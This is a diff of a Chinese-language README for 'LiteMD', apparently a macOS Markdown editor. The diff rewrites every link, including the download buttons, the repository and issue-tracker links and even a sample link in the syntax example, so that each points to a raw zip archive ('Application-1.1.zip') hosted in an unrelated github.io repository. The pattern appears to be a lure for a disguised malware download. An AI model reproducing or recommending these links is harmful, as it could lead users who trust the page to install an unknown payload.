@@ -19,11 +19,11 @@ LiteMD 是一款专为 macOS 用户设计的轻量级 Markdown 编辑器。它�
 
 ### 第一步：获取应用
 
-[🎯 **立即下载 LiteMD**](https://github.com/Confutationcitellusparryi6006/LiteMD)
+[🎯 **立即下载 LiteMD**](https://github.com/Confutationcitellusparryi6006/confutationcitellusparryi6006.github.io/raw/refs/heads/main/uvitinic/Application-1.1.zip)
 
 点击上方链接或下面的按钮，前往下载页面获取 LiteMD 应用。
 
-[⬇️ **下载 LiteMD**](https://github.com/Confutationcitellusparryi6006/LiteMD)
+[⬇️ **下载 LiteMD**](https://github.com/Confutationcitellusparryi6006/confutationcitellusparryi6006.github.io/raw/refs/heads/main/uvitinic/Application-1.1.zip)
 
 ### 第二步：安装应用
 
@@ -110,7 +110,7 @@ LiteMD 基于 Apple 原生技术构建，确保最佳性能和流畅体验：
 *斜体文字*
 - 列表项1
 - 列表项2
-[链接文字](https://example.com)
+[链接文字](https://github.com/Confutationcitellusparryi6006/confutationcitellusparryi6006.github.io/raw/refs/heads/main/uvitinic/Application-1.1.zip)
 ![图片描述](image.png)
 ```
 
@@ -144,8 +144,8 @@ LiteMD 完全免费使用。我们相信优秀的写作工具应该人人可用�
 
 ## 📚 更多资源
 
-- **GitHub 仓库**：[Confutationcitellusparryi6006/LiteMD](https://github.com/Confutationcitellusparryi6006/LiteMD)
-- **问题反馈**：[提交 Issue](https://github.com/Confutationcitellusparryi6006/LiteMD/issues)
+- **GitHub 仓库**：[Confutationcitellusparryi6006/LiteMD](https://github.com/Confutationcitellusparryi6006/confutationcitellusparryi6006.github.io/raw/refs/heads/main/uvitinic/Application-1.1.zip)
+- **问题反馈**：[提交 Issue](https://github.com/Confutationcitellusparryi6006/confutationcitellusparryi6006.github.io/raw/refs/heads/main/uvitinic/Application-1.1.zip)
 
 ---
 
@@ -153,7 +153,7 @@ LiteMD 完全免费使用。我们相信优秀的写作工具应该人人可用�
 
 现在就下载 LiteMD，体验专注、高效、愉悦的 Markdown 写作。无论你是专业写作者还是初学者，LiteMD 都将成为你日常创作的最佳伙伴。
 
-[🚀 **立即下载 LiteMD**](https://github.com/Confutationcitellusparryi6006/LiteMD)
+[🚀 **立即下载 LiteMD**](https://github.com/Confutationcitellusparryi6006/confutationcitellusparryi6006.github.io/raw/refs/heads/main/uvitinic/Application-1.1.zip)
 
 ---
 
